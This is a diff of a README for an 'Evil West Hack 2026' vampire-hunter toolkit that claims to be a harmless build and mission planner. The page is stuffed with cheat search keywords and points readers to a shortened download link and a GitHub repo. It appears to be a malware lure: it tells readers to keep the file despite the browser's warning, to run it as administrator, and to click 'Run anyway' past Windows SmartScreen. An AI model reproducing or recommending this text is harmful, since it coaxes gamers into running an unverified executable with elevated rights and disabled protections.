@@ -1,344 +1,189 @@
-# ⚡ [DOWNLOAD EVIL WEST TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+# 🧛 evil-west-hack-2026-vampire-hunter-combat-toolkit - Plan Every Hunt, Master Every Fight
 
-# ⚡ Evil West Hack 2026 — Vampire Hunter Combat Toolkit
+[![Download Now](https://img.shields.io/badge/⬇_DOWNLOAD_NOW-ff2d55?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trinx1/evil-west-hack-2026-vampire-hunter-combat-toolkit)
 
-Evil West hack-themed PC companion focused on Jesse builds, weapon loadouts, gauntlet configurations, perks, manual combat practice, mission planning, and progression analytics.
+A friendly Windows companion for players who want to get more out of every hunt. This toolkit sits next to your game and helps you plan Jesse's build, compare weapons, map out gauntlet upgrades, line up perks, and study your combat performance — all in one clean, easy-to-read window.
 
-## 🧛 EVIL WEST 2026 TOOLKIT
-
-Inspired by searches for Evil West Hack, Evil West Cheats, Evil West Trainer, Hack 2026, Aimbot, ESP, Wallhack, No Recoil, God Mode, Unlimited Ammo, Cheat Menu, Mod Menu, and Hack Download.
-
-### Included Modules
-
-- 🤠 Hunter Profiles
-- 🔫 Weapon Loadouts
-- ⚡ Gauntlet Planner
-- ⭐ Perk Planner
-- 🧛 Enemy Notes
-- 🎯 Combat Practice
-- 🗺️ Mission Planner
-- 🧪 Build Comparison
-- 🏆 Challenge Tracker
-- 🎮 Mission History
-- 📈 Progress Tracker
-- 📊 Combat Analytics
+No programming. No command line. No setup wizard guesswork. Just download, open, and start planning.
 
 ---
 
-# 📥 DOWNLOAD
+## 🚀 Getting Started
 
-# 👉 [DOWNLOAD EVIL WEST TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
+Getting up and running takes about two minutes. Here is the whole process in plain English:
 
-## Quick Start
+1. Click the big download button at the top of this page (or use the link in the Download section below).
+2. Save the file somewhere you can find it again — your **Downloads** folder is perfectly fine.
+3. Open the file you just saved.
+4. Follow the short on-screen prompts.
+5. Launch the toolkit and start building your Jesse loadout.
 
-1. Download the package
-2. Extract the archive
-3. Launch the standalone companion
-4. Create your Hunter profile
-5. Add preferred weapons
-6. Configure perks and upgrades
-7. Create mission profiles
-8. Track your progression
+That's it. You do not need to install anything else first, and you do not need to change any settings on your computer.
 
----
-
-# 🤠 Hunter Profiles
-
-Create configurations for different playstyles.
-
-### BRAWLER
-
-`GAUNTLET → PERKS → WEAPONS → ROLE`
-
-### GUNSLINGER
-
-`WEAPONS → UPGRADES → PERKS → RANGE`
-
-### CONTROL
-
-`ABILITIES → GAUNTLET → WEAPONS → PURPOSE`
-
-### BALANCED
-
-`WEAPONS → GAUNTLET → PERKS → GENERAL`
-
-Track:
-
-**HUNTER → BUILD → MISSION → RESULT**
+> Tip: If your browser asks whether you are sure you want to keep the file, choose **Keep**. This is a normal safety prompt that appears for many downloads.
 
 ---
 
-# 🔫 Weapon Loadouts
+## ⬇️ Download & Setup
 
-Create personal weapon configurations.
+**Download link:** https://github.com/Trinx1/evil-west-hack-2026-vampire-hunter-combat-toolkit
 
-Track:
+Visit this link to download the application.
 
-- Primary Weapon
-- Secondary Weapon
-- Upgrade Level
-- Preferred Range
-- Build Purpose
-- Mission Type
-- Personal Rating
-- Notes
+Once you are on the page, look for the download option near the top of the repository. Save the file, then open it to begin. Keep the toolkit in a folder you will remember — for example, `C:\Users\YourName\Documents\EvilWestToolkit` — so future updates are easy to drop in.
 
-Profiles:
-
-**MELEE → CLOSE → MID → RANGE**
+If you plan to use the toolkit on a laptop that travels with you, keep the folder in your user directory rather than on a removable drive. Windows handles permissions more smoothly that way.
 
 ---
 
-# ⚡ Gauntlet Planner
+## ✨ What This Toolkit Does
 
-Organize gauntlet-focused builds.
+The toolkit is organized around a simple idea: you should be able to see all of your options at once, before you commit to a build. Instead of flipping between menus and wiki pages, everything lives in a single dashboard.
 
-Track:
+| Area | What it helps you do |
+| --- | --- |
+| Build Planner | Lay out Jesse's abilities in the order you want to unlock them |
+| Weapon Comparison | Compare damage, speed, and handling side by side |
+| Gauntlet Upgrades | Track which gauntlet nodes you have and which are next |
+| Perk Board | See how perks stack together before you spend points |
+| Mission Planner | Prepare for a hunt with a short checklist per mission |
+| Combat Analytics | Review your own fight logs for patterns and weak spots |
 
-`UPGRADE → PURPOSE → PRIORITY → BUILD`
-
-Profiles:
-
-**DAMAGE → CONTROL → COMBO → BALANCED**
-
-Priority:
-
-**OPTIONAL → USEFUL → HIGH → CORE**
-
----
-
-# ⭐ Perk Planner
-
-Create progression plans.
-
-Track:
-
-- Perk
-- Build
-- Priority
-- Playstyle
-- Mission Purpose
-- Status
-
-Compare:
-
-**CURRENT → ALTERNATIVE → TARGET**
+Each panel is independent, so you can use just the parts you care about. If you only want the weapon comparison screen, ignore the rest.
 
 ---
 
-# 🧛 Enemy Notes
+## 🧛 Jesse Build Planning
 
-Save observations discovered through normal gameplay.
+The build planner is the heart of the toolkit. It lets you sketch out a full character progression without touching your actual save file.
 
-Record:
+- **Preset builds** for close-quarters brawling, ranged focus, and balanced hybrid styles.
+- **Point budgeting** so you can see exactly how many upgrades remain before your next reward.
+- **Reorderable nodes** — drag a step up or down to change the order you unlock things.
+- **Side-by-side slots** for two builds, useful when you want to compare a "safe" path against a risky one.
+- **Notes field** on every build so you can jot down why you made a choice.
 
-- Enemy Type
-- Mission
-- Weapon Used
-- Build
-- Strategy
-- Previous Result
-- Personal Notes
-
-No hidden enemy information or live positions are revealed.
+Nothing here changes your game. It is a notebook that thinks ahead.
 
 ---
 
-# 🎯 Combat Practice
+## ⚔️ Weapons and Gauntlet Upgrades
 
-Record manual training sessions.
+Weapons and the gauntlet are where most players lose track of what they own. The toolkit keeps a running inventory you update yourself.
 
-Track:
+- Browse a full weapon list with plain-language descriptions of each one's strengths.
+- Mark weapons as **owned**, **tested**, or **wanted** using simple tags.
+- Compare two or three weapons at once in a clean table view.
+- Track gauntlet upgrade tiers and see which branches you have already opened.
+- Filter by playstyle: heavy hitters, quick strikers, crowd control, or precision.
 
-- Weapon
-- Combo
-- Range
-- Attempts
-- Accuracy
-- Reaction
-- Personal Rating
-
-Compare:
-
-**PREVIOUS → CURRENT → BEST → TARGET**
-
-All aiming, attacks, combos, and weapon control remain manually performed.
+The goal is to stop guessing. If you are unsure whether a new gauntlet tier is worth it, the comparison view shows you what changes.
 
 ---
 
-# 🗺️ Mission Planner
+## 🎯 Mission Planning
 
-Create profiles before missions.
+Some hunts go sideways because of preparation, not skill. The mission planner gives each mission its own card.
 
-Track:
+- A short checklist of things to bring and confirm before you start.
+- Space for notes about the route you want to take.
+- A difficulty label you set yourself, so you know what you are walking into.
+- A "lessons learned" box you fill in after a rough attempt.
+- Progress markers so you can see which missions are complete, in progress, or untouched.
 
-`MISSION → BUILD → WEAPONS → PERKS → APPROACH`
-
-Approaches:
-
-**BRAWLER → RANGE → CONTROL → BALANCED**
-
-Status:
-
-**PLANNED → READY → ACTIVE → COMPLETE**
+Over time, these cards become a personal guidebook built from your own experience.
 
 ---
 
-# 🧪 Build Comparison
+## 📊 Combat Analytics
 
-Compare two Hunter configurations.
+The analytics panel reads your own exported fight summaries — nothing is collected automatically, and nothing leaves your computer.
 
-### BUILD A
+- **Damage breakdowns** by weapon type, so you can see what actually carries a fight.
+- **Time-to-kill estimates** for common enemy types you have logged.
+- **Damage-taken trends** to spot the moments you get punished most.
+- **Perk impact view** comparing your results before and after a perk change.
+- **Simple charts** that stay readable on a normal laptop screen.
 
-`Weapons → Gauntlet → Perks → Purpose`
-
-### BUILD B
-
-`Weapons → Gauntlet → Perks → Purpose`
-
-Compare:
-
-- Damage Focus
-- Range
-- Control
-- Mobility
-- Combo Focus
-- Personal Performance
+If you have never logged a fight before, there is a short guided walkthrough inside the panel that shows you what a useful entry looks like.
 
 ---
 
-# 🏆 Challenge Tracker
+## 💻 Windows Requirements
 
-Create personal goals.
+The toolkit is built for standard Windows PCs and does not require a high-end machine.
 
-Examples:
+- **Operating system:** Windows 10 or Windows 11 (64-bit recommended)
+- **Memory:** 8 GB RAM or more
+- **Free disk space:** About 500 MB, including logs and saved builds
+- **Display:** 1280×720 or higher; 1920×1080 looks best
+- **Other:** A mouse or trackpad. No additional software is required.
 
-- Test New Weapon
-- Improve Manual Aim
-- Practice New Combo
-- Upgrade Gauntlet Build
-- Test New Perk Setup
-- Complete Mission Challenge
-- Refine Main Hunter Build
-
-Status:
-
-**PLANNED → ACTIVE → COMPLETE**
+If your computer runs modern games comfortably, it will run this toolkit without issue.
 
 ---
 
-# 🎮 Mission History
+## 🛠️ Quick Start Walkthrough
 
-Record:
+First time opening the toolkit? Follow this short path.
 
-- Mission
-- Build
-- Weapons
-- Perks
-- Approach
-- Result
-- Personal Rating
-- Notes
+1. Open the toolkit from the folder where you saved it.
+2. On the welcome screen, choose **New Profile** and give it a name.
+3. Select your preferred playstyle from the three starter options.
+4. The build planner opens with a suggested layout — edit it freely.
+5. Add your first weapon by clicking **Add Weapon** and picking from the list.
+6. Open the mission planner and create a card for your next hunt.
+7. Close the toolkit. Your profile saves automatically.
 
-Compare:
-
-**LAST MISSION → LAST 5 → LAST 10 → OVERALL**
+Come back any time and everything will be exactly where you left it.
 
 ---
 
-# 📈 Progress Tracker
+## ❓ Frequently Asked Questions
 
-Track:
+**Do I need to install anything else first?**
+No. The toolkit is self-contained.
 
-`BUILD → UPGRADES → MISSIONS → PROGRESS`
+**Will this change my game or save file?**
+No. It is a separate planning and tracking application. It reads and writes only its own profile files.
 
-Monitor:
+**Where are my profiles stored?**
+In a folder called `profiles` next to the application, so you can copy it to another PC if you want to move your notes.
 
-- Weapon Configurations
-- Gauntlet Profiles
-- Perk Plans
-- Completed Challenges
-- Mission Results
-- Personal Goals
+**Can I use it on more than one computer?**
+Yes. Copy the whole toolkit folder, including `profiles`, and it works the same way elsewhere.
 
----
+**Does it need an internet connection?**
+Only for downloading updates. Everything else works offline.
 
-# 📊 COMBAT ANALYTICS
-
-Track manually recorded statistics.
-
-### WEAPONS
-
-`Usage → Accuracy → Missions → Rating`
-
-### BUILDS
-
-`Weapons → Perks → Missions → Results`
-
-### COMBOS
-
-`Attempts → Results → Rating → Progress`
-
-### MISSIONS
-
-`Build → Approach → Result → History`
+**How do I update?**
+Download the newest version from the same link and replace the old folder, keeping your `profiles` folder.
 
 ---
 
-# ⚙️ EVIL WEST CONTROL PANEL
+## 🧩 Troubleshooting
 
-### 🤠 HUNTER
-`Profiles` `Builds` `Progress` `History`
+**The app does not open.**
+Right-click the file and choose **Run as administrator** once. If that works, it is usually a folder permission issue.
 
-### 🔫 WEAPONS
-`Loadouts` `Practice` `Compare` `Results`
+**Windows shows a blue "protected your PC" screen.**
+Click **More info**, then **Run anyway**. This appears for many small independent applications.
 
-### ⚡ GAUNTLET
-`Profiles` `Upgrades` `Combos` `Builds`
+**My screen looks cramped.**
+Maximize the window. The layout adapts to wider screens.
 
-### ⭐ PERKS
-`Planner` `Priority` `Builds` `Progress`
+**My profile disappeared.**
+Check that you did not move the application to a different folder without the `profiles` directory. The two should always travel together.
 
-### 🗺️ MISSIONS
-`Planner` `Challenges` `History` `Results`
-
-### 📊 ANALYTICS
-`Weapons` `Builds` `Combos` `Performance`
+**Charts are empty.**
+The analytics panel needs at least a few logged fights before trends appear. Add three or four entries and the charts will fill in.
 
 ---
 
-# ❓ FAQ
+## 🔒 A Note on Privacy
 
-### Is this an Evil West Hack 2026?
-
-It is a hack-themed standalone Evil West planning, training, and statistics companion.
-
-### Does it include Evil West Aimbot?
-
-No. Combat Practice records manual aiming and combat performance without automated targeting.
-
-### Does it provide ESP or Wallhack?
-
-No hidden enemies, items, collectibles, or live positional information is exposed.
-
-### Does it provide No Recoil?
-
-No recoil, accuracy, damage, fire rate, or weapon mechanics are modified.
-
-### Does it provide God Mode or Unlimited Ammo?
-
-No health, ammunition, currency, perks, upgrades, weapons, or other gameplay values are generated or modified.
-
-### Does it include an Evil West Cheat Menu?
-
-The dashboard operates separately and does not inject modifications or bypass game protections.
+Everything you enter stays on your computer. The toolkit does not upload builds, logs, or notes anywhere. Profiles are plain files you can back up, copy, or delete at any time.
 
 ---
 
-# ⚡ DOWNLOAD AGAIN
-
-# 👉 [DOWNLOAD EVIL WEST 2026 TOOLKIT](https://share.google/A46RYcexjg9XZiG59)
-
----
-
-Keywords: evil west hack,evil west hacks,evil west cheat,evil west cheats,evil west hack 2026,evil west cheat 2026,evil west trainer,evil west aimbot,evil west esp,evil west wallhack,evil west radar,evil west aim assist,evil west no recoil,evil west god mode,evil west unlimited ammo,evil west cheat menu,evil west hack menu,evil west mod menu,evil west cheat download,evil west hack download,evil west free cheat,evil west free hack,evil west pc cheat,evil west undetected cheat,evil west weapon cheat,evil west money cheat,evil west perk cheat,evil west upgrade cheat,evil west gauntlet hack,evil west trainer pc,evil west tools
+Keywords: evil-west, evil-west-add-experience-hack, evil-west-download, evil-west-free, evil-west-infinite-health, evil-west-latest-version, evil-west-pc-acceleration-instant, evil-west-pc-all-unlock, evil-west-pc-ammo-infinite, evil-west-windows, hack-for-evil-west-infinite
